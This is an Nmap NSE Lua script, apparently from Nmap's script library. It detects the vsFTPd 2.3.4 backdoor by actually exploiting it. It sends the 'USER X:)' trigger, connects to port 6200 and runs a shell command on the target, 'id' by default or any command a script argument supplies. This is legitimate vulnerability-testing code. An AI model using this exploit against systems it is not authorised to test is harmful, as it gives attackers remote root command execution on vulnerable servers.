-- -*- mode: lua -*-
-- vim: set filetype=lua :

description = [[
Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04. This
script attempts to exploit the backdoor using the innocuous <code>id</code>
command by default, but that can be changed with the
<code>ftp-vsftpd-backdoor.cmd</code> script argument.

References:
 * http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
 * https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093
]]

---
-- @usage
-- nmap --script ftp-vsftpd-backdoor -p 21 <host>
--
-- @args ftp-vsftpd-backdoor.cmd Command to execute in shell (default is
--       <code>id</code>).
--
-- @output
-- PORT   STATE SERVICE
-- 21/tcp open  ftp
-- | ftp-vsftpd-backdoor:
-- |   This installation has been backdoored.
-- |   Command: id
-- |   Results: uid=0(root) gid=0(wheel) groups=0(wheel)
-- |_

author = "Daniel Miller"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive"}

require("ftp")
require("shortport")
require("stdnse")

local CMD_FTP = "USER X:)\r\nPASS X\r\n"
local CMD_SHELL = "id"

portrule = function (host, port)
	-- Check if version detection knows what FTP server this is.
	if port.version.product ~= nil and port.version.product ~= "vsftpd" then
		return false
	end

	-- Check if version detection knows what version of FTP server this is.
	if port.version.version ~= nil and port.version.version ~= "2.3.4" then
		return false
	end

       return shortport.port_or_service(21, "ftp")(host, port)
end

action = function(host, port)
	local cmd, err, resp, results, sock, status

	-- Get script arguments.
	cmd = stdnse.get_script_args("ftp-vsftpd-backdoor.cmd")
	if not cmd then
		cmd = CMD_SHELL
	end

	-- Create socket.
	sock = nmap.new_socket("tcp")
	sock:set_timeout(5000)
	status, err = sock:connect(host, port, "tcp")
	if not status then
		stdnse.print_debug(1, "Can't connect: %s", err)
		sock:close()
		return
	end

	-- Read banner.
	buffer = stdnse.make_buffer(sock, "\r?\n")
	local code, message = ftp.read_reply(buffer)
	if not code then
		stdnse.print_debug(1, "Can't read banner: %s", message)
		sock:close()
		return
	end

	-- Send command to escalate privilege.
	status, err = sock:send(CMD_FTP .. "\r\n")
	if not status then
		stdnse.print_debug(1, "Failed to send privilege escalation command: %s", err)
		sock:close()
		return
	end

	-- Check if escalation worked.
	stdnse.sleep(1)
	sock:close()
	sock = nmap.new_socket("tcp")
	sock:set_timeout(5000)
	status, err = sock:connect(host, 6200, "tcp")
	if not status then
		stdnse.print_debug(1, "Can't connect, not vulnerable: %s", err)
		sock:close()
		return
	end

	-- Send command(s) to shell.
	status, err = sock:send(cmd .. ";\r\n")
	if not status then
		stdnse.print_debug(1, "Failed to send shell command(s): %s", err)
		sock:close()
		return
	end

	-- Check for an error from command.
	status, resp = sock:receive()
	if not status then
		stdnse.print_debug(1, "Can't read command response: %s", resp)
		sock:close()
		return
	end

	-- Summarize the results.
	results = {
	   "This installation has been backdoored.",
	   "Command: " .. CMD_SHELL,
	   "Results: " .. resp
	}

	return stdnse.format_output(true, results)
end
